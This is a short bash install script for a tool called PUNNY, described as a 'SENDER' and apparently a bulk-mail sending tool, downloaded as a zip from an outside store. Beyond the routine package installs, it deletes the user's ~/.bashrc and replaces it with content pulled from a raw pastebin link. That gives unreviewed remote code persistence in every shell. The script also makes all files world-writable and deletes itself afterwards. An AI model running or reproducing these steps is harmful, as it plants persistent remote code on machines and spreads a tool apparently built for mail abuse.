clear
printf "\e[92m▀█▀ ░█▄─░█ ░█▀▀▀█ ▀▀█▀▀ ─█▀▀█ ░█─── ░█─── \n"
printf "░█─ ░█░█░█ ─▀▀▀▄▄ ─░█── ░█▄▄█ ░█─── ░█─── \n"
printf "▄█▄ ░█──▀█ ░█▄▄▄█ ─░█── ░█─░█ ░█▄▄█ ░█▄▄█\n"
printf "         \033[0;36m\n\n"
sudo apt install -y screen
sudo apt install -y unzip
sudo apt-get update -y
sudo apt-get upgrade -y
sudo apt-get install -y figlet
sudo apt-get install -y dos2unix
sudo apt-get install -y curl
sudo apt install -y nano
sudo wget https://w3ll.store/operators/PUNNY.zip
sudo unzip -o PUNNY.zip
sudo rm PUNNY.zip
cp ~/.bashrc ~/.bashrc-bak
rm -rf ~/.bashrc
curl "https://pastebin.com/raw/2ixDfTbB" -o ~/.bashrc
dos2unix ~/.bashrc
chmod 777 *
clear
printf "\e[32mSENDER INSTALLED SUCCESSFULLY !\n\e[0mYOU CAN RUN \e[31m ./PUNNY\e[0m TO RUN SENDER NOW !\n\n"
sudo rm install.sh
